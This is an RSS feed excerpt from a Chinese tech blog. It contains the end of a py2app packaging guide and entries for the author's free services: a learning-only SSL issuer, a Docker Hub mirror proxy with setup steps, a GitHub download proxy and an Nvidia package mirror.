<h2>方式2：使用py2app发布</h2>
<h4>1. 安装py2app</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>pip3 install py2app  -i https://pypi.tuna.tsinghua.edu.cn/simple</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>2. 生成 setup.py 文件</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>py2applet --make-setup main.py</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<h4>3. 清空以前生成的编译文件</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>rm -rf build dist</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>4. 生成mac下的应用</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>python setup.py py2app</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>找到app</p>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>友情链接</title>
      <link>https://www.geekery.cn/about/friend.html</link>
      <guid>https://www.geekery.cn/about/friend.html</guid>
      <source url="https://www.geekery.cn/rss.xml">友情链接</source>
      <description>友情链接</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>牛马时钟</title>
      <link>https://www.geekery.cn/free-service/OxHorseClock.html</link>
      <guid>https://www.geekery.cn/free-service/OxHorseClock.html</guid>
      <source url="https://www.geekery.cn/rss.xml">牛马时钟</source>
      <description>牛马时钟</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>SSL 证书生成</title>
      <link>https://www.geekery.cn/free-service/SSLGenerate.html</link>
      <guid>https://www.geekery.cn/free-service/SSLGenerate.html</guid>
      <source url="https://www.geekery.cn/rss.xml">SSL 证书生成</source>
      <description>SSL 证书生成 声明： 本服务为学习用途，通过自建 CA 签发 SSL 证书。请勿用于生产环境。 网上的证书签发要么签发门槛很高，要么价格极高。 我去查询了阿某云的价格表格。 这价格很是惊人，于是乎我自己做了CA服务器，仅供学习。 用途上的话网站急需证书却无法签发可以使用，切勿生产使用。</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p><strong>声明：</strong> 本服务为学习用途，通过自建 CA 签发 SSL 证书。<strong>请勿用于生产环境</strong>。</p>
</blockquote>
<p>网上的证书签发要么签发门槛很高，要么价格极高。</p>
<p>我去查询了阿某云的价格表格。</p>
<p>| 证书类型       | 适用场景                | 支持域名        | 价格（人民币/月） |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>Base64在线编码解码</title>
      <link>https://www.geekery.cn/free-service/base64.html</link>
      <guid>https://www.geekery.cn/free-service/base64.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Base64在线编码解码</source>
      <description>Base64在线编码解码 最好用的 Base64 在线工具, 支持图片编解码和预览</description>
      <category>Tools</category>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>最好用的 Base64 在线工具, 支持图片编解码和预览</p>
</blockquote>
]]></content:encoded>
    </item>
    <item>
      <title>代码差异对比</title>
      <link>https://www.geekery.cn/free-service/code-diff.html</link>
      <guid>https://www.geekery.cn/free-service/code-diff.html</guid>
      <source url="https://www.geekery.cn/rss.xml">代码差异对比</source>
      <description>代码差异对比 查找两个文本文件之间的差异</description>
      <category>Tools</category>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>查找两个文本文件之间的差异</p>
</blockquote>

]]></content:encoded>
    </item>
    <item>
      <title>Cron在线表达式生成器</title>
      <link>https://www.geekery.cn/free-service/cron.html</link>
      <guid>https://www.geekery.cn/free-service/cron.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Cron在线表达式生成器</source>
      <description>Cron在线表达式生成器</description>
      <category>Tools</category>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>DockerHub镜像加速</title>
      <link>https://www.geekery.cn/free-service/docker-hub-mirror.html</link>
      <guid>https://www.geekery.cn/free-service/docker-hub-mirror.html</guid>
      <source url="https://www.geekery.cn/rss.xml">DockerHub镜像加速</source>
      <description>Docker镜像拉取加速服务及配置指南 6月6日，上海交大的 Docker Hub 镜像加速器 宣布因监管要求被下架，Dockerhub 无法访问。具体可看此通知。 image-20241010100318565 功能简介 免费学习使用的Docker镜像拉取加速服务，破解Docker官方限制频率等多种应用场景，无限速拉取镜像。 很多种功能都是独家支持，...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>6月6日，<a href="https://mirrors.ustc.edu.cn/help/dockerhub.html" target="_blank" rel="noopener noreferrer">上海交大的 Docker Hub 镜像加速器</a> 宣布因监管要求被下架，Dockerhub 无法访问。<a href="https://web.archive.org/web/20240606081039/https://sjtug.org/post/mirror-news/2024-06-06-takedown-dockerhub/" target="_blank" rel="noopener noreferrer">具体可看此通知</a>。</p>
<p></p>
</blockquote>
<h2>功能简介</h2>
<p>免费学习使用的Docker镜像拉取加速服务，破解Docker官方限制频率等多种应用场景，无限速拉取镜像。</p>
<p>很多种功能都是独家支持，源码是闭源的，防止被滥用，根据下面教程设置镜像站即可畅快使用。</p>
<ul>
<li>拉取Dockerhub的私有仓库的镜像加速</li>
<li>推送镜像到Dockerhub账户</li>
<li>一键安装Docker 加速</li>
<li>公共仓库的镜像加速</li>
<li>Docker Search命令专项加速</li>
<li>防火墙和黑名单😢</li>
</ul>
<h2>Docker配置镜像加速</h2>
<blockquote>
<p>Docker镜像加速不同的操作系统有不同的设置方法，需要根据操作系统类型去设置，下面给出了Linux、Windows、Mac操作系统的设置方法。</p>
<p>为了方便使用，Linux设置镜像站已经写为脚本。</p>
</blockquote>
<h3>Linux</h3>
<p>配置镜像站</p>

<p>适用于Ubuntu、Debian、CentOS、Fedora、Arch Linux、openSUSE 等系统。</p>
<p>其他版本可能有细微不同，请访问官方文档获取更多详情。</p>
<h3>MacOS</h3>
<blockquote>
<p>评论区帮忙补个MacOS配置图😘</p>
</blockquote>
<p>对于MacOS上的Docker For Mac用户，您可以通过以下步骤配置镜像加速服务：</p>
<p>点击桌面顶栏的docker图标，选择Preferences。</p>
<p>在Daemon标签下的Registry mirrors列表中加入以下镜像地址：</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">https:</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//hub.certauth.top/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">https:</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//ghcr.geekery.cn/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>点击Apply &amp; Restart按钮使设置生效。</p>
<h3>Windows</h3>
<p>Windows系统上的Docker For Windows用户可以按照以下步骤配置镜像加速服务：</p>
<p>在桌面右下角状态栏中右键docker图标，修改在Docker Engine标签页中的json。</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "builder"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "gc"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "defaultKeepStorage"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"20GB"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "enabled"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "experimental"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "registry-mirrors"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   "https://hub.certauth.top/"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   "https://ghcr.geekery.cn"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>点击Apply&amp;restart，使配置生效。</p>
<h2>一键安装Docker</h2>
<blockquote>
<p>这个脚本适用于Linux</p>
<p>一键安装脚本，为了防止脚本卡住，于是我做了完整的镜像，包括安装包仓库。默认使用 <code>https://download-docker.geekery.cn</code> 为镜像站</p>
</blockquote>

<h2>通过镜像站拉取DockerHub私有账户的镜像</h2>
<h3>登录到镜像站</h3>
<p>首先，你需要登陆到镜像站。如果还没有登录，可以使用以下命令：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> login</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.certauth.top</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>然后，系统会提示你输入用户名和密码，输入你的dockerhub用户名密码即可登录。</p>
<h3>拉取私有镜像</h3>
<p>成功登录后，就可以从私有仓库中拉取镜像。使用<code>docker pull</code>命令加上仓库的完整URL以及镜像的名称和标签（如果有的话）。例如：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pull</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.certauth.top/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">namespac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">imagenam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这里 <code>&lt;namespace&gt;</code> 可以是用户名或组织名，<code>&lt;imagename&gt;</code> 是镜像的名字，<code>&lt;tag&gt;</code> 是镜像的版本标签。</p>
<h3>恢复默认镜像名</h3>
<p>如果你想要如同DockerHub镜像一般直接不写域名直接跑，方便后面环境的使用，可以增加如下步骤恢复原有的镜像名称。</p>
<p>执行下面的命令将会更改Docker镜像的镜像站为Dockerhub，方便使用。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tag</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.certauth.top/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">namespac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">imagenam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt; &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">namespac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">imagenam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这里 <code>&lt;namespace&gt;</code> 可以是用户名或组织名，<code>&lt;imagename&gt;</code> 是镜像的名字，<code>&lt;tag&gt;</code> 是镜像的版本标签。</p>
<h2>通过镜像站推送镜像到DockerHub</h2>
<h3>登录镜像站</h3>
<p>首先，你需要登陆到镜像站。如果还没有登录，可以使用以下命令：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> login</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.certauth.top</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>然后，系统会提示你输入用户名和密码，输入你的dockerhub用户名密码即可登录。</p>
<h3>更改镜像标记</h3>
<p>你需要tag镜像设置被推送到镜像仓库。使用以下格式的命令来标记镜像：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tag</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">local-image-nam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">local-ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">hub.certauth.top/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">namespac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">imagenam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>例如，如果你有一个名为 <code>myimage</code> 的本地镜像，并且你想将其推送到 <code>hub.certauth.top</code> 上的 <code>myuser</code> 名下的 <code>myrepo</code> 仓库，使用如下命令：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tag</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myimage:latest</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.certauth.top/myuser/myrepo:latest</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>推送镜像</h3>
<p>使用 <code>docker push</code> 命令将其推送到私有仓库：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> push</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.certauth.top/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">namespac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">imagenam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>例如：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> push</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.certauth.top/myuser/myrepo:latest</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这会把标记过的镜像推送到你的私有仓库，然后回到dockerhub检查，镜像已经推送到dockerhub当中去了。</p>
<h2>Docker search命令加速</h2>
<p>近期看到有人用docker search，但是配置了镜像站仍然无法加速搜索。所以我这里新增了Docker hub的search加速。</p>
<p>使用如下方式进行搜索</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> search</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.certauth.top/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">search</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> imag</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>例如</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> search</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.certauth.top/nginx</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<h2>黑名单</h2>
<p>本站建立的初衷是用于个人学习使用，方便自己也方便别人，近期发现有人滥用，我加功能的时候也写了个防火墙。</p>
<p>有源地址每天请求几万次，经过日志审计我认为是在生产的集群上使用了本加速镜像。我这边的自动程序处理方法是将你的源ip地址自动添加进黑名单，生产使用请联系我捐助解除禁止。</p>
<p>使用本镜像站同步镜像站的滥用行为，请求源ip地址将会被加进黑名单。</p>
<h2>你用的节点在哪里？</h2>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<div id="mobaxterm">
    <iframe style="height:800px" src="https://cloudflare-cloudnative-pages.geekery.cn/docker"></iframe>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>GitHub加速下载</title>
      <link>https://www.geekery.cn/free-service/github-direct.html</link>
      <guid>https://www.geekery.cn/free-service/github-direct.html</guid>
      <source url="https://www.geekery.cn/rss.xml">GitHub加速下载</source>
      <description>GitHub加速下载 在Linux上下载GitHub文件太慢了，直接受不了。于是我做了一个用于加速 GitHub 文件下载速度的代理服务，旨在帮助用户更快地获取 GitHub 上的文件、Releases、archive、gist以及raw.githubusercontent.com 文件。通过我们的代理服务，你可以更快地下载这些文件，提高效率，节省时间...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>在Linux上下载GitHub文件太慢了，直接受不了。于是我做了一个用于加速 GitHub 文件下载速度的代理服务，旨在帮助用户更快地获取 GitHub 上的文件、Releases、archive、gist以及raw.githubusercontent.com 文件。通过我们的代理服务，你可以更快地下载这些文件，提高效率，节省时间。</p>
<ul>
<li>
<p>地址： <a href="https://github.geekery.cn/" target="_blank" rel="noopener noreferrer">https://github.geekery.cn/</a></p>
</li>
<li>
<p>项目源码： <a href="https://github.com/Paper-Dragon/github-proxy" target="_blank" rel="noopener noreferrer">https://github.com/Paper-Dragon/github-proxy</a></p>
</li>
</ul>
<h2>主要功能</h2>
<ul>
<li>加速 GitHub 文件下载</li>
<li>提供对 Releases 的加速访问</li>
<li>加速 archive 和 gist 的下载</li>
<li>优化 <a href="https://raw.githubusercontent.com" target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com</a> 文件的下载速度</li>
<li>加速 <a href="https://codeload.github.com" target="_blank" rel="noopener noreferrer">https://codeload.github.com</a> 的下载</li>
</ul>
<h2>如何使用</h2>
<p>您只需将原始URL替换为我代理服务的地址，即可享受到加速下载的便利。举例：</p>

<h2>联系我</h2>
<p>如果您有任何问题或建议，请随时评论区联系我。仅供学习使用，非法使用必追究法律责任！</p>
]]></content:encoded>
    </item>
    <item>
      <title>Nvidia镜像站</title>
      <link>https://www.geekery.cn/free-service/nvidia-mirror.html</link>
      <guid>https://www.geekery.cn/free-service/nvidia-mirror.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Nvidia镜像站</source>
      <description>Nvidia镜像站 在 Ubuntu 系统中使用 Nvidia 显卡时，下载驱动速度可能会非常慢。为了解决这个问题，我搭建了一个镜像站来加速下载。 镜像站提供两个主要地址： 开发者工具镜像站 地址：nvidia-developer.geekery.cn 包含 CUDA 工具等 Nvidia 开发必需资源。 Docker Runtime 镜像站 地址：n...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>在 Ubuntu 系统中使用 Nvidia 显卡时，下载驱动速度可能会非常慢。为了解决这个问题，我搭建了一个镜像站来加速下载。</p>
<p>镜像站提供两个主要地址：</p>
<p><strong>开发者工具镜像站</strong></p>
<ul>
<li>地址：<a href="https://nvidia-developer.geekery.cn" target="_blank" rel="noopener noreferrer">nvidia-developer.geekery.cn</a></li>
<li>包含 CUDA 工具等 Nvidia 开发必需资源。</li>
</ul>
<p><strong>Docker Runtime 镜像站</strong></p>
<ul>
<li>地址：<a href="https://nvidia-docker.geekery.cn" target="_blank" rel="noopener noreferrer">nvidia-docker.geekery.cn</a></li>
<li>提供 libnvidia-container，用于支持容器内的 Nvidia 显卡运行。</li>
</ul>
<ul>
<li>
<p>预览<strong>libnvidia-container</strong> 镜像源  <a href="https://nvidia-docker.geekery.cn/libnvidia-container/stable/" target="_blank" rel="noopener noreferrer">https://nvidia-docker.geekery.cn/libnvidia-container/stable/</a></p>
</li>
<li>
<p>预览<strong>cuda</strong> 镜像仓库    <a href="https://nvidia-developer.geekery.cn/compute/cuda/repos/" target="_blank" rel="noopener noreferrer">https://nvidia-developer.geekery.cn/compute/cuda/repos/</a></p>
</li>
</ul>
<h2>一键部署Nvidia-Docker脚本</h2>
